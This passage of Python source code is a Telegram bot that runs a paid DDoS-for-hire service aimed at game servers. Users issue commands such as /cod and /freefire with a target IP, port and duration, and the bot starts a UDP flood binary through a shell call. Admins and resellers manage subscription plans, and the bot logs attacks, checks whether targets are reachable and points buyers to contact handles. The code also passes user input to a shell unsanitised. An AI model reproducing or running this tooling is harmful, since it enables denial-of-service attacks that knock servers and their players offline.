                    response = "𝐀𝐥𝐥 2 𝐬𝐥𝐨𝐭𝐬 𝐚𝐫𝐞 𝐢𝐧 𝐮𝐬𝐞. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭 𝐮𝐧𝐭𝐢𝐥 𝐨𝐧𝐞 𝐨𝐟 𝐭𝐡𝐞𝐦 𝐟𝐢𝐧𝐢𝐬𝐡."
                else:
                    # Perform the attack
                    full_command = f"./GAME-UDP {target} {port} {time} 10"
                    subprocess.Popen(full_command, shell=True)
                    response = f"𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: 𝐅𝐑𝐄𝐄𝐅𝐈𝐑𝐄"
                    # Update ongoing attacks dictionary
                    user_cooldowns.setdefault(message.from_user.id, {})['last_attack_time'] = datetime.now()
                    user_cooldowns.setdefault(message.from_user.id, {})['target'] = target
                    user_cooldowns.setdefault(message.from_user.id, {})['time'] = time
            bot.reply_to(message, response)
        else:
            response = "𝐔𝐬𝐚𝐠𝐞: /freefire [𝐭𝐚𝐫𝐠𝐞𝐭] [𝐩𝐨𝐫𝐭] [𝐭𝐢𝐦𝐞]"
            bot.reply_to(message, response)
    except Exception as e:
        response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐞𝐧𝐬𝐮𝐫𝐞 𝐲𝐨𝐮 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐭𝐡𝐞 𝐜𝐨𝐫𝐫𝐞𝐜𝐭 𝐟𝐨𝐫𝐦𝐚𝐭: /freefire [𝐭𝐚𝐫𝐠𝐞𝐭] [𝐩𝐨𝐫𝐭] [𝐭𝐢𝐦𝐞]"
        print("Error:", e)
        bot.reply_to(message, response)

def count_ongoing_attacks():
    ongoing_attacks_count = 0
    for user_id, cooldown_info in user_cooldowns.items():
        if 'target' in cooldown_info and 'time' in cooldown_info:
            remaining_time = cooldown_info['time'] - (datetime.now() - user_cooldowns[user_id]['last_attack_time']).total_seconds()
            if remaining_time > 0:
                ongoing_attacks_count += 1
    return ongoing_attacks_count

def check_cooldown(user_id):
    if user_id in user_cooldowns:
        last_attack_time = user_cooldowns[user_id].get('last_attack_time', datetime.min)
        time_difference = datetime.now() - last_attack_time
        if time_difference < timedelta(seconds=60):  # 60 seconds cooldown
            return True
    return False

def get_cooldown_remaining(user_id):
    last_attack_time = user_cooldowns[user_id].get('last_attack_time', datetime.min)
    time_difference = datetime.now() - last_attack_time
    cooldown_seconds = max(0, int((timedelta(seconds=60) - time_difference).total_seconds()))
    return cooldown_seconds

# Define your Telegram group ID
YOUR_GROUP_ID = "-1002145597666"

# Command to send attack
@bot.message_handler(commands=['cod'])
def handle_attack(message):
    try:
        # Check if the message is from your group
        if str(message.chat.id) != YOUR_GROUP_ID:
            response = "𝐘𝐨𝐮 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐮𝐬𝐞 𝐢𝐧 𝐠𝐫𝐨𝐮𝐩 @bgmi_ddos_powerful"
            bot.reply_to(message, response)
            return
        
        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            port = command[2]
            time = min(int(command[3]), 60)  # Maximum time allowed is 60 seconds
            # Validate target IP
            if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', target):
                response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐚 𝐯𝐚𝐥𝐢𝐝 𝐈𝐏."
            # Validate port
            elif not port.isdigit() or not (1 <= int(port) <= 65535):
                response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐚 𝐯𝐚𝐥𝐢𝐝 𝐩𝐨𝐫𝐭 𝐧𝐮𝐦𝐛𝐞𝐫."
            # Validate time
            elif not (1 <= time <= 60):
                response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐚 𝐯𝐚𝐥𝐢𝐝 𝐭𝐢𝐦𝐞 𝐦𝐚𝐱 [𝟔𝟎 𝐬𝐞𝐜𝐨𝐧𝐝𝐬]"
            elif check_cooldown(message.from_user.id):
                cooldown_seconds = get_cooldown_remaining(message.from_user.id)
                response = f"𝐘𝐨𝐮 𝐜𝐚𝐧 𝐬𝐞𝐧𝐝 𝐚𝐭𝐭𝐚𝐜𝐤 𝐚𝐟𝐭𝐞𝐫 {cooldown_seconds} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬 𝐜𝐨𝐨𝐥𝐝𝐨𝐰𝐧!"
            else:
                if count_ongoing_attacks() >= 3:
                    response = "𝐀𝐥𝐥 𝟑 𝐬𝐥𝐨𝐭𝐬 𝐚𝐫𝐞 𝐢𝐧 𝐮𝐬𝐞. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭 𝐮𝐧𝐭𝐢𝐥 𝐨𝐧𝐞 𝐨𝐟 𝐭𝐡𝐞𝐦 𝐟𝐢𝐧𝐢𝐬𝐡."
                else:
                    # Perform the attack
                    full_command = f"./GAME-UDP {target} {port} {time} 100"
                    subprocess.Popen(full_command, shell=True)
                    response = f"𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: 𝐂𝐎𝐃"
                    # Update ongoing attacks dictionary
                    user_cooldowns.setdefault(message.from_user.id, {})['last_attack_time'] = datetime.now()
                    user_cooldowns.setdefault(message.from_user.id, {})['target'] = target
                    user_cooldowns.setdefault(message.from_user.id, {})['time'] = time
            bot.reply_to(message, response)
        else:
            response = "𝐔𝐬𝐚𝐠𝐞: /cod [𝐭𝐚𝐫𝐠𝐞𝐭] [𝐩𝐨𝐫𝐭] [𝐭𝐢𝐦𝐞]"
            bot.reply_to(message, response)
    except Exception as e:
        response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐞𝐧𝐬𝐮𝐫𝐞 𝐲𝐨𝐮 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐭𝐡𝐞 𝐜𝐨𝐫𝐫𝐞𝐜𝐭 𝐟𝐨𝐫𝐦𝐚𝐭: /cod [𝐭𝐚𝐫𝐠𝐞𝐭] [𝐩𝐨𝐫𝐭] [𝐭𝐢𝐦𝐞]"
        print("Error:", e)
        bot.reply_to(message, response)

def count_ongoing_attacks():
    ongoing_attacks_count = 0
    for user_id, cooldown_info in user_cooldowns.items():
        if 'target' in cooldown_info and 'time' in cooldown_info:
            remaining_time = cooldown_info['time'] - (datetime.now() - user_cooldowns[user_id]['last_attack_time']).total_seconds()
            if remaining_time > 0:
                ongoing_attacks_count += 1
    return ongoing_attacks_count

def check_cooldown(user_id):
    if user_id in user_cooldowns:
        last_attack_time = user_cooldowns[user_id].get('last_attack_time', datetime.min)
        time_difference = datetime.now() - last_attack_time
        if time_difference < timedelta(seconds=60):  # 60 seconds cooldown
            return True
    return False

def get_cooldown_remaining(user_id):
    last_attack_time = user_cooldowns[user_id].get('last_attack_time', datetime.min)
    time_difference = datetime.now() - last_attack_time
    cooldown_seconds = max(0, int((timedelta(seconds=60) - time_difference).total_seconds()))
    return cooldown_seconds

# Command to delete user
@bot.message_handler(commands=['delete'])
def delete_user(message):
    if message.from_user.username in admin_usernames or message.from_user.username in reseller_usernames:
        command = message.text.split()
        if len(command) == 2:
            username = command[1]
            if username in user_plans:
                del user_plans[username]
                if username in user_cooldowns:  # Check if the user exists in user_cooldowns
                    del user_cooldowns[username]  # Delete the user from user_cooldowns if exists
                update_allusers_file()  # Update allusers.txt file
                response = f"𝐔𝐬𝐞𝐫 @{username} 𝐝𝐞𝐥𝐞𝐭𝐞𝐝."
            else:
                response = f"𝐍𝐨 𝐩𝐥𝐚𝐧 𝐟𝐨𝐮𝐧𝐝 𝐟𝐨𝐫 𝐮𝐬𝐞𝐫 @{username}."
        else:
            response = "𝐔𝐬𝐚𝐠𝐞: /delete [𝐮𝐬𝐞𝐫𝐧𝐚𝐦𝐞]"
    else:
        response = "𝐘𝐨𝐮'𝐫𝐞 𝐧𝐨𝐭 𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐭𝐨 𝐮𝐬𝐞 𝐭𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝!"
    bot.reply_to(message, response)

# Function to update allusers.txt file
def update_allusers_file():
    try:
        with open('allusers.txt', 'w') as file:
            for username, plan_info in user_plans.items():
                end_date = plan_info['end_date'].strftime("%Y-%m-%d")
                attacks = plan_info['attacks']
                cooldown = plan_info['cooldown']
                file.write(f"{username} {end_date} {attacks} {cooldown}\n")
    except Exception as e:
        print("Error updating allusers.txt file:", e)

# Command to update user plan
@bot.message_handler(commands=['update'])
def update_user(message):
    if message.from_user.username in admin_usernames or message.from_user.username in reseller_usernames:
        command = message.text.split()
        if len(command) == 6:
            username = command[1]
            days = int(command[2])
            attacks = int(command[3])
            cooldown = int(command[4])
            end_date = datetime.now() + timedelta(days=days)
            user_plans[username] = {'end_date': end_date, 'attacks': attacks, 'cooldown': cooldown}
            response = f"User {username} plan updated: {days} days, {attacks} attack time, {cooldown} seconds cooldown."
            # Update the plan in allusers.txt
            update_user_plan_in_file(username, days, attacks, cooldown)
        else:
            response = "𝐔𝐬𝐚𝐠𝐞: /update [𝐮𝐬𝐞𝐫𝐧𝐚𝐦𝐞] [𝐝𝐚𝐲𝐬] [𝐭𝐨𝐭𝐚𝐥_𝐚𝐭𝐭𝐚𝐜𝐤_𝐭𝐢𝐦𝐞] [𝐜𝐨𝐨𝐥𝐝𝐨𝐰𝐧_𝐬𝐞𝐜𝐨𝐧𝐝𝐬]"
    else:
        response = "𝐘𝐨𝐮'𝐫𝐞 𝐧𝐨𝐭 𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐭𝐨 𝐮𝐬𝐞 𝐭𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚????!"
    bot.reply_to(message, response)

# Function to update user plan in allusers.txt
def update_user_plan_in_file(username, days, attacks, cooldown):
    try:
        with open("allusers.txt", "r+") as file:
            lines = file.readlines()
            file.seek(0)
            for index, line in enumerate(lines):
                parts = line.strip().split(',')
                if parts[0] == username:
                    updated_line = f"{username} {days} {attacks} {cooldown}\n"
                    lines[index] = updated_line
                    break
            file.seek(0)
            file.writelines(lines)
            file.truncate()
    except Exception as e:
        print("Error updating user plan in file:", e)

# Command to check user info
@bot.message_handler(commands=['info'])
def user_info(message):
    if message.from_user.username in admin_usernames or message.from_user.username in reseller_usernames:
        command = message.text.split()
        if len(command) == 2:
            username = command[1]
            user_info = get_user_info_from_file(username)
            if user_info:
                end_date, attacks, cooldown = user_info
                response = f"@{username}'𝐬 𝐩𝐥𝐚𝐧: {end_date} - {attacks} 𝐚𝐭𝐭𝐚𝐜𝐤 𝐭𝐢𝐦𝐞 𝐫𝐞𝐦𝐚𝐢𝐧𝐢𝐧𝐠."
            else:
                response = f"𝐍𝐨 𝐩𝐥𝐚𝐧 𝐟𝐨𝐮𝐧𝐝 𝐟𝐨𝐫 𝐮𝐬𝐞𝐫 @{username}."
        else:
            response = "𝐔𝐬𝐚𝐠𝐞: /info [𝐮𝐬𝐞𝐫𝐧𝐚𝐦𝐞]"
    else:
        response = "𝐘𝐨𝐮'𝐫𝐞 𝐧𝐨𝐭 𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐭𝐨 𝐮𝐬𝐞 𝐭𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝!"
    bot.reply_to(message, response)

# Function to get user information from allusers.txt
def get_user_info_from_file(username):
    try:
        with open("allusers.txt", "r") as file:
            for line in file:
                parts = line.strip().split()
                if parts[0] == username:
                    end_date = datetime.strptime(parts[1], "%Y-%m-%d")
                    attacks = int(parts[2])
                    cooldown = int(parts[3])
                    return end_date.strftime("%Y-%m-%d"), attacks, cooldown
    except Exception as e:
        print("Error getting user info from file:", e)
    return None

# Command to check all users' plans
@bot.message_handler(commands=['allusers'])
def handle_all_users(message):
    if message.from_user.username in admin_usernames or message.from_user.username in reseller_usernames:
        response = "𝐋𝐢𝐬𝐭 𝐨𝐟 𝐚𝐥𝐥 𝐚𝐝𝐝𝐞𝐝 𝐮𝐬𝐞𝐫𝐬:\n"
        all_user_info = get_all_users_info_from_file()
        if all_user_info:
            for username, user_info in all_user_info.items():
                end_date, attacks, cooldown = user_info
                response += f"𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: @{username}, 𝐄𝐧𝐝 𝐃𝐚𝐭𝐞: {end_date}, 𝐓𝐨𝐭𝐚𝐥 𝐚𝐭𝐭𝐚𝐜𝐤 𝐭𝐢𝐦𝐞: {attacks}, 𝐂𝐨𝐨𝐥𝐝𝐨??𝐧: {cooldown} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬\n"
        else:
            response = "𝐍𝐨 𝐮𝐬𝐞𝐫 𝐟𝐨𝐮𝐧𝐝 𝐢𝐧 𝐚𝐥𝐥𝐮𝐬𝐞𝐫𝐬.𝐭𝐱𝐭."
    else:
        response = "𝐘𝐨𝐮'𝐫𝐞 𝐧𝐨𝐭 𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐭𝐨 𝐮𝐬𝐞 𝐭𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝!"
    bot.reply_to(message, response)

# Function to get information of all users from allusers.txt
def get_all_users_info_from_file():
    try:
        all_users_info = {}
        with open("allusers.txt", "r") as file:
            for line in file:
                parts = line.strip().split()
                username = parts[0]
                end_date = datetime.strptime(parts[1], "%Y-%m-%d")
                attacks = int(parts[2])
                cooldown = int(parts[3])
                all_users_info[username] = (end_date.strftime("%Y-%m-%d"), attacks, cooldown)
        return all_users_info
    except Exception as e:
        print("Error getting all users' info from file:", e)
        return None

# Command to check ongoing attacks
@bot.message_handler(commands=['ongoing'])
def check_ongoing_attacks(message):
    if message.from_user.username in admin_usernames or message.from_user.username in reseller_usernames:
        response = "𝐎𝐧𝐠𝐨𝐢𝐧𝐠 𝐀𝐭𝐭𝐚𝐜𝐤𝐬:\n"
        for username, cooldown_info in user_cooldowns.items():
            if 'target' in cooldown_info and 'time' in cooldown_info:
                target = cooldown_info['target']
                time = cooldown_info['time']
                remaining_time = time - (datetime.now() - user_cooldowns[username]['last_attack_time']).total_seconds()
                if remaining_time > 0:
                    response += f"𝐔𝐬𝐞𝐫: @{username}, 𝐓𝐚𝐫𝐠𝐞𝐭: {target}, 𝐓𝐢𝐦𝐞: {time}, 𝐑𝐞𝐦𝐚𝐢𝐧𝐢𝐧𝐠 𝐭𝐢𝐦𝐞: {remaining_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬\n"
        if response == "𝐎𝐧𝐠𝐨𝐢𝐧𝐠 𝐀𝐭𝐭𝐚𝐜𝐤𝐬:\n":
            response += "𝐍𝐨 𝐨𝐧𝐠𝐨𝐢𝐧𝐠 𝐚𝐭𝐭𝐚𝐜𝐤𝐬 𝐟𝐨𝐮𝐧𝐝."
    else:
        response = "𝐘𝐨𝐮'𝐫𝐞 𝐧𝐨𝐭 𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐭𝐨 𝐮𝐬𝐞 𝐭𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝!"
    bot.reply_to(message, response)

# Command to view all attacks of a specific user
@bot.message_handler(commands=['viewattacks'])
def view_user_attacks(message):
    if message.from_user.username in admin_usernames or message.from_user.username in reseller_usernames:
        command = message.text.split()
        if len(command) == 2:
            username = command[1]
            response = f"𝐀𝐥𝐥 𝐚𝐭𝐭𝐚𝐜𝐤𝐬 𝐨𝐟 @{username}:\n"
            try:
                with open("attacks.txt", "r") as file:
                    lines = file.readlines()
                    user_attacks = [line.strip().split() for line in lines if line.strip().split()[0] == username]
                    if user_attacks:
                        for attack in user_attacks:
                            target = attack[1]
                            time = attack[2]
                            date = attack[3]
                            response += f"𝐓𝐚𝐫𝐠𝐞𝐭: {target}, 𝐓𝐢𝐦𝐞: {time}, 𝐃𝐚𝐭𝐞: {date}\n"
                    else:
                        response = f"𝐍𝐨 𝐚𝐭𝐭𝐚𝐜𝐤𝐬 𝐟𝐨𝐮𝐧𝐝 𝐟𝐨𝐫 𝐮𝐬𝐞𝐫 @{username}."
            except Exception as e:
                response = "𝐀𝐧 𝐞𝐫𝐫𝐨𝐫 𝐨𝐜𝐜𝐮𝐫𝐫𝐞𝐝 𝐰𝐡𝐢𝐥𝐞 𝐩𝐫𝐨𝐜𝐞𝐬𝐬𝐢𝐧𝐠 𝐭𝐡𝐞 𝐫𝐞𝐪𝐮𝐞𝐬𝐭."
                print("Error:", e)
        else:
            response = "𝐔𝐬𝐚𝐠𝐞: /viewattacks [𝐮𝐬𝐞𝐫𝐧𝐚𝐦𝐞]"
    else:
        response = "𝐘𝐨𝐮'𝐫𝐞 𝐧𝐨𝐭 𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐭𝐨 𝐮𝐬𝐞 𝐭𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝!"
    bot.reply_to(message, response)

# Command to view all attacks sent by the user
@bot.message_handler(commands=['myattacks'])
def view_user_attacks(message):
    username = message.from_user.username
    response = f"𝐘𝐨𝐮𝐫 𝐚𝐥𝐥 𝐬𝐞𝐧𝐭 𝐚𝐭𝐭𝐚𝐜𝐤𝐬 @{username}:\n"
    try:
        with open("attacks.txt", "r") as file:
            lines = file.readlines()
            user_attacks = [line.strip().split() for line in lines if line.strip().split()[0] == username]
            if user_attacks:
                for attack in user_attacks:
                    target = attack[1]
                    time = attack[2]
                    date = attack[3]
                    response += f"𝐓𝐚𝐫𝐠𝐞𝐭: {target}, 𝐓𝐢𝐦𝐞: {time}, 𝐃𝐚𝐭𝐞: {date}\n"
            else:
                response = f"𝐍𝐨 𝐚𝐭𝐭𝐚𝐜𝐤𝐬 𝐟𝐨𝐮𝐧𝐝 𝐟𝐨𝐫 @{username}."
    except Exception as e:
        response = "𝐀𝐧 𝐞𝐫𝐫𝐨𝐫 𝐨𝐜𝐜𝐮𝐫𝐫𝐞𝐝 𝐰𝐡𝐢𝐥𝐞 𝐩𝐫𝐨𝐜𝐞𝐬𝐬𝐢𝐧𝐠 𝐭𝐡𝐞 𝐫𝐞𝐪𝐮𝐞𝐬𝐭."
        print("Error:", e)
    bot.reply_to(message, response)

# Command to display available commands
@bot.message_handler(commands=['start', 'help', 'command'])
def display_help(message):
    response = "[𝐔𝐒𝐄𝐑𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒]👇👇👇👇\n"
    response += "\n"
    response += "/bgmi  𝐒𝐞𝐧𝐝 𝐚𝐭𝐭𝐚𝐜𝐤 (𝐦𝐚𝐱 𝟔𝟎 𝐬𝐞𝐜𝐨𝐧𝐝𝐬).\n"
    response += "/pubg  𝐒𝐞𝐧𝐝 𝐚𝐭𝐭𝐚𝐜𝐤 (𝐦𝐚𝐱 𝟔𝟎 𝐬𝐞𝐜𝐨𝐧𝐝𝐬).\n"
    response += "/freefire  𝐒𝐞𝐧𝐝 𝐚𝐭𝐭𝐚𝐜𝐤 (𝐦𝐚𝐱 𝟔𝟎 𝐬𝐞𝐜𝐨𝐧𝐝𝐬).\n"
    response += "/cod  𝐒𝐞𝐧𝐝 𝐚𝐭𝐭𝐚𝐜𝐤 (𝐦𝐚𝐱 𝟔𝟎 𝐬𝐞𝐜𝐨𝐧𝐝𝐬).\n"
    bot.reply_to(message, response)

@bot.message_handler(commands=['admin'])
def display_help(message):
    response = "𝐀𝐃𝐌𝐈𝐍 :- @o_aron_o\n"
    response += "\n"
    response += "𝐀𝐃𝐌𝐈𝐍 :- @Crypticxsoul\n"
    bot.reply_to(message, response)

# Bot start time
start_time = time.time()

# Command to check server info
@bot.message_handler(commands=['serverinfo'])
def check_server_info(message):
    # Get CPU usage percentage
    cpu_usage = psutil.cpu_percent(interval=1)
    cpu_info = f"<b>Total CPU:</b> {psutil.cpu_count(logical=False)} cores\n<b>CPU Usage:</b> {cpu_usage}%"
    
    # Get RAM usage information
    ram_info = psutil.virtual_memory()
    ram_total = round(ram_info.total / (1024 ** 3), 2)  # Total RAM in GB
    ram_usage = ram_info.percent
    ram_info = f"<b>Total RAM:</b> {ram_total} GB\n<b>RAM Usage:</b> {ram_usage}%"
    
    # Get storage usage information
    storage_info = psutil.disk_usage('/')
    storage_total = round(storage_info.total / (1024 ** 3), 2)  # Total storage in GB
    storage_usage = storage_info.percent
    storage_info = f"<b>Total Storage:</b> {storage_total} GB\n<b>Storage Usage:</b> {storage_usage}%"
    
    # Calculate bot uptime in seconds
    uptime_seconds = round(time.time() - start_time)
    uptime_info = f"<b>Bot Uptime (Seconds):</b> {uptime_seconds}"
    
    # Get current date and time
    current_date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    date_info = f"<b>Current Date:</b> {current_date}"
    
    # Construct the response message with bold text formatting
    response = f"<b>Bot is running!</b>\n\n{cpu_info}\n{ram_info}\n{storage_info}\n{uptime_info}\n{date_info}"
    
    # Send the response message
    bot.reply_to(message, response, parse_mode='HTML')

# Function to check if a URL is valid
def is_valid_url(url):
    regex = re.compile(
        r'^(?:http|ftp)s?://'  # http:// or https://
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+[A-Z]{2,63}|'  # domain...
        r'localhost|'  # localhost...
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'  # ...or IP
        r'(?::\d+)?'  # optional port
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    return re.match(regex, url) is not None

# Function to check the host and send the result to Telegram
def check_host(url, message, duration):
    if not is_valid_url(url):
        bot.send_message(chat_id=message.chat.id, text=f"<b>𝐄𝐫𝐫𝐨𝐫:</b> 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐔𝐑𝐋 𝐟𝐨𝐫𝐦𝐚𝐭.", parse_mode="HTML")
        return
    
    start_time = time.time()
    elapsed_time = 0
    while elapsed_time < duration:
        try:
            # Add "https://" if not present in the URL
            if not url.startswith("http://") and not url.startswith("https://"):
                url = "https://" + url

            response = requests.get(url, timeout=2)

            response_messages = {
                100: "Continue", 101: "Switching Protocols", 200: "OK", 201: "Created", 202: "Accepted",
                203: "Non-Authoritative Information", 204: "No Content", 205: "Reset Content", 206: "Partial Content",
                300: "Multiple Choices", 301: "Moved Permanently", 302: "Found", 303: "See Other", 304: "Not Modified",
                305: "Use Proxy", 307: "Temporary Redirect", 400: "Bad Request", 401: "Unauthorized", 402: "Payment Required",
                403: "Forbidden", 404: "Not Found", 405: "Method Not Allowed", 406: "Not Acceptable",
                407: "Proxy Authentication Required", 408: "Request Timeout", 409: "Conflict", 410: "Gone",
                411: "Length Required", 412: "Precondition Failed", 413: "Request Entity Too Large",
                414: "Request-URI Too Long", 415: "Unsupported Media Type", 416: "Requested Range Not Satisfiable",
                417: "Expectation Failed", 500: "Internal Server Error", 501: "Not Implemented", 502: "Bad Gateway",
                503: "Service Unavailable", 504: "Gateway Timeout", 505: "HTTP Version Not Supported"
            }

            if response.status_code in response_messages:
                message_text = f"Host {url} is reachable. Response code: {response.status_code} {response_messages[response.status_code]}"
            else:
                message_text = f"Host {url} is reachable. Response code: {response.status_code}"

            # Special case handling for Server is Down
            if response.status_code == 503 and "server is down" in response.text.lower():
                message_text = f"<b>Warning:</b> Server at {url} is reporting Service Unavailable. (Custom message: server is down)"

            # Send the message to Telegram with HTML formatting
            bot.send_message(chat_id=message.chat.id, text=f"<b>{message_text}</b>", parse_mode="HTML")
        except requests.exceptions.Timeout:
            bot.send_message(chat_id=message.chat.id, text=f"<b>Request to host {url} timed out.</b> Server may be slow to respond.", parse_mode="HTML")
        except requests.exceptions.RequestException:
            bot.send_message(chat_id=message.chat.id, text=f"<b>Failed to connect to host {url}.</b>", parse_mode="HTML")

        time.sleep(0)  # Wait for 1 second before sending the next message
        elapsed_time = time.time() - start_time

# Command handler for /check command
@bot.message_handler(commands=['check'])
def handle_check(message):
    username = message.from_user.username
    if username in user_plans:
        plan_info = user_plans[username]
        if plan_info['end_date'] > datetime.now():
            # Split the message text to get the URL
            command_parts = message.text.split()
            if len(command_parts) == 2:
                url = command_parts[1]
                duration = 10  # Default duration set to 10 seconds
                threading.Thread(target=check_host, args=(url, message, duration)).start()
            else:
                bot.reply_to(message, "𝐔𝐬𝐚𝐠𝐞: /check 𝐮𝐫𝐥")
        else:
            bot.reply_to(message, "𝐁𝐮𝐲 𝐩𝐥𝐚𝐧: @o_aron_o")
    else:
        bot.reply_to(message, "𝐁𝐮𝐲 𝐩𝐥𝐚𝐧: @o_aron_o")

# Admin user IDs
admin_ids = ["2104592399", "2104592399"]

# File to store custom messages
custom_messages_file = "custom_messages.txt"

# Load custom messages from file
custom_messages = {}
with open(custom_messages_file, "r") as file:
    for line in file:
        parts = line.strip().split(":")
        if len(parts) == 2:
            key = parts[0].strip().lower()
            value = parts[1].strip()
            custom_messages[key] = value

# Command to add custom message
@bot.message_handler(commands=['addmessage', 'addmsg'])
def add_custom_message(message):
    if str(message.from_user.id) in admin_ids:
        command_parts = message.text.split(maxsplit=1)
        if len(command_parts) == 2 and '-' in command_parts[1]:
            keyword, reply_message = command_parts[1].split("-", 1)
            keyword = keyword.strip().lower()
            reply_message = reply_message.strip()
            custom_messages[keyword] = reply_message

            # Update custom messages file
            with open(custom_messages_file, "a") as file:
                file.write(f"{keyword}:{reply_message}\n")

            bot.reply_to(message, f"𝐂𝐮𝐬𝐭𝐨𝐦 𝐦𝐞𝐬𝐬𝐚𝐠𝐞 '{reply_message}' 𝐚𝐝𝐝𝐞𝐝 𝐟𝐨𝐫 𝐤𝐞𝐲𝐰𝐨𝐫𝐝 '{keyword}'.")
        else:
            bot.reply_to(message, "𝐔𝐬𝐚𝐠𝐞 :- /addmessage 𝐨𝐫 /addmsg 𝐤𝐞𝐲𝐰𝐨𝐫𝐝 - 𝐫𝐞𝐩𝐥𝐲_𝐦𝐞𝐬𝐬𝐚𝐠𝐞.")
    else:
        bot.reply_to(message, "𝐘𝐨𝐮'𝐫𝐞 𝐧𝐨𝐭 𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐭?? 𝐮𝐬𝐞 𝐭𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝!")

# Command to delete custom message
@bot.message_handler(commands=['deletemessage', 'deletemsg'])
def delete_custom_message(message):
    if str(message.from_user.id) in admin_ids:
        command_parts = message.text.split(maxsplit=1)
        if len(command_parts) == 2:
            keyword = command_parts[1].strip().lower()
            if keyword in custom_messages:
                del custom_messages[keyword]

                # Update custom messages file
                with open(custom_messages_file, "w") as file:
                    for key, value in custom_messages.items():
                        file.write(f"{key}:{value}\n")

                bot.reply_to(message, f"𝐂𝐮𝐬𝐭𝐨𝐦 𝐦𝐞𝐬𝐬𝐚𝐠𝐞 𝐟𝐨𝐫 𝐤𝐞𝐲𝐰𝐨𝐫𝐝 '{keyword}' 𝐝𝐞𝐥𝐞𝐭𝐞𝐝.")
            else:
                bot.reply_to(message, f"𝐍𝐨 𝐜𝐮𝐬𝐭𝐨𝐦 𝐦𝐞𝐬𝐬𝐚𝐠𝐞 𝐟𝐨𝐮𝐧𝐝 𝐟𝐨𝐫 𝐤𝐞𝐲𝐰𝐨𝐫𝐝 '{keyword}'.")
        else:
            bot.reply_to(message, "𝐔𝐬𝐚𝐠𝐞 :- /deletemessage 𝐨𝐫 /deletemsg 𝐤𝐞𝐲𝐰𝐨𝐫𝐝.")
    else:
        bot.reply_to(message, "𝐘𝐨𝐮'𝐫𝐞 𝐧𝐨𝐭 𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐭𝐨 𝐮𝐬𝐞 𝐭𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝!")

# Reply to messages with custom messages
@bot.message_handler(func=lambda message: any(keyword in message.text.lower() for keyword in custom_messages))
def reply_to_message(message):
    for keyword, reply_message in custom_messages.items():
        if keyword in message.text.lower():
            bot.reply_to(message, reply_message)
            break

# Replace 'ADMIN_ID' with your Telegram admin user ID
admin_id = '2104592399'

# Command handler for /checkspeed
@bot.message_handler(commands=['checkspeed'])
def check_speed(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    if str(user_id) != admin_id:
        bot.send_message(chat_id, "𝐘𝐨𝐮'𝐫𝐞 𝐧𝐨𝐭 𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐭𝐨 𝐮𝐬𝐞 𝐭𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝!")
        return
    bot.send_message(chat_id, "<b>Please wait while your request is processing...</b>", parse_mode='HTML')
    try:
        st = speedtest.Speedtest()
        st.get_best_server()
        download_speed = st.download() / 1024 / 1024  # Convert to Mbps
        upload_speed = st.upload() / 1024 / 1024  # Convert to Mbps
